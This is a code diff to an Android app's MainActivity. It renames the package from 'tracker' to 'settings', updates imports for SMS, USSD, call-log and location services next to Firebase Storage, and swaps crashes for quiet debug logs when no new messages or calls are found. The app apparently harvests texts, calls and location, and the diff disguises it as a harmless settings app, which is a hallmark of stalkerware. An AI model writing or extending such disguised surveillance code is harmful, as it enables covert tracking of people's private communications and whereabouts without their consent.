@@ -1,4 +1,4 @@
-package com.reas.tracker
+package com.reas.settings
 
 import android.Manifest
 import android.app.ActivityManager
@@ -25,10 +25,10 @@ import com.google.firebase.storage.ktx.storage
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.google.gson.stream.JsonReader
-import com.reas.tracker.service.SMS.SMSBaseObject
-import com.reas.tracker.service.USSD.USSDService
-import com.reas.tracker.service.calls.CallBaseObject
-import com.reas.tracker.service.location.LocationService
+import com.reas.settings.service.SMS.SMSBaseObject
+import com.reas.settings.service.USSD.USSDService
+import com.reas.settings.service.calls.CallBaseObject
+import com.reas.settings.service.location.LocationService
 import java.io.File
 import java.io.FileReader
 import java.io.FileWriter
@@ -428,7 +428,7 @@ class MainActivity : AppCompatActivity() {
                 }
                 cursorIncoming.close()
             } else {
-                throw RuntimeException("You have no new messages")
+                Log.d("MainActivity", "doInBackground: You have no new messages")
             }
 
             // Outgoing messages
@@ -471,7 +471,7 @@ class MainActivity : AppCompatActivity() {
                 }
                 cursorOutgoing.close()
             } else {
-                throw RuntimeException("You have no new messages")
+                Log.d("MainActivity", "doInBackground: You have no new messages")
             }
 
             // Checks for duplicate
@@ -612,7 +612,7 @@ class MainActivity : AppCompatActivity() {
 
 
             } else {
-                throw RuntimeException("You have no new calls")
+                Log.d("MainActivity", "doInBackground: No new calls")
             }
 
             cursor.close()
